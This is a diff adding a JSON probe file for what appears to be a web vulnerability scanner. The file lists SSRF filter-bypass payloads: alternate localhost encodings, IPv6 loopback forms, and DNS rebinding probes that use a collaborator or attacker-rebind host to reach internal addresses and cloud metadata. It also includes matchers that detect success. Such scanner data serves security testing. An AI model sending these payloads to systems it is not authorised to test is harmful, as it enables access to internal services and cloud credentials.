@@ -1,0 +1,328 @@
+{
+  "category": "ssrf_bypass",
+  "description": " \u2014 bypass variants (localhost / IPv6 / DNS rebinding)",
+  "contexts": {
+    "localhost_bypass": {
+      "description": "SSRF localhost bypass probes \u2014 alternative IP representations that resolve to 127.0.0.1 but evade string-based blocklists",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
+      "probes": [
+        {
+          "payload": "http://127.1/",
+          "description": "Shortened localhost IP \u2014 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "blocked",
+                "not allowed",
+                "invalid url",
+                "denied"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "http://0177.0.0.1/",
+          "description": "Octal notation for 127.0.0.1 \u2014 0177 = 127 in octal; many URL parsers resolve this to localhost",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "blocked",
+                "not allowed",
+                "invalid url",
+                "denied"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "http://0x7f.0.0.1/",
+          "description": "Hex notation for 127.0.0.1 \u2014 0x7f = 127 in hex; bypasses decimal IP blocklists",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "blocked",
+                "not allowed",
+                "invalid url",
+                "denied"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "http://2130706433/",
+          "description": "Decimal integer notation for 127.0.0.1 \u2014 2130706433 = 0x7F000001; evades dotted-quad filters entirely",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "blocked",
+                "not allowed",
+                "invalid url",
+                "denied"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "http://[::1]/",
+          "description": "IPv6 loopback address \u2014 canonical localhost in IPv6, bypasses IPv4-only blocklists",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "blocked",
+                "not allowed",
+                "invalid url",
+                "denied"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "http://0/",
+          "description": "Zero IP \u2014 resolves to 0.0.0.0 which maps to localhost on many systems",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "blocked",
+                "not allowed",
+                "invalid url",
+                "denied"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
+    },
+    "ipv6_bypass": {
+      "description": "SSRF bypass using IPv6 representations of localhost \u2014 evades blocklists checking for 127.0.0.1 in string form",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
+      "probes": [
+        {
+          "payload": "http://[::ffff:127.0.0.1]/",
+          "description": "IPv4-mapped IPv6 address for localhost \u2014 bypasses simple string match on 127.0.0.1",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+          "description": "Full-form IPv4-mapped IPv6 localhost \u2014 alternative notation evading short-form filters",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "http://[::1]/",
+          "description": "IPv6 loopback address (::1) \u2014 canonical localhost in IPv6, bypasses IPv4-only blocklists",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    },
+    "dns_rebinding": {
+      "description": "SSRF via DNS rebinding \u2014 exploits time-of-check vs time-of-use when server validates DNS then fetches, allowing second resolution to point to internal IP",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "uri",
+        "path",
+        "dest",
+        "redirect",
+        "site",
+        "html",
+        "feed",
+        "to",
+        "out",
+        "callback",
+        "domain",
+        "rurl",
+        "return"
+      ],
+      "probes": [
+        {
+          "payload": "http://{{callback}}/ssrf-rebind-check",
+          "description": "DNS rebinding baseline \u2014 send Collaborator URL to confirm server-side fetch occurs; Collaborator DNS interaction is prerequisite for rebinding attack",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 0
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        },
+        {
+          "payload": "http://0x7f000001.{{callback}}/",
+          "description": "Hex IP subdomain rebinding probe \u2014 some DNS resolvers resolve hex-encoded IPs in subdomains to 127.0.0.1; Collaborator interaction + internal content confirms rebinding",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "blocked",
+                "not allowed",
+                "invalid url",
+                "denied"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    },
+    "dns_rebinding_advanced": {
+      "description": "DNS rebinding 2024+ variants. Classic A-record TTL-0 swap is well-known; new vectors abuse SVCB/HTTPS records (RFC 9460) and WebRTC ICE candidate disclosure.",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "host",
+        "callback"
+      ],
+      "probes": [
+        {
+          "payload": "http://attacker-rebind.collaborator.example/",
+          "description": "[Manual] DNS rebind: attacker domain returns public IP first, 127.0.0.1 / 169.254.169.254 second. Apps that re-resolve between TOCTOU validation and fetch hit internal target.",
+          "matchers": [
+            {
+              "type": "word",
+              "any": [
+                "ami-id",
+                "instance-identity",
+                "iam"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {
+            "manual_chain": true,
+            "COLLAB_REQUIRED": true
+          }
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] SVCB / HTTPS resource records (RFC 9460): attacker DNS returns SVCB pointing at internal IP via 'ipv4hint'/'ipv6hint'. HTTP clients that prefer SVCB without re-validating get redirected internally.",
+          "matchers": [
+            {
+              "type": "word",
+              "any": [
+                "169.254",
+                "127.0.0.1",
+                "metadata"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
+    }
+  }
+}
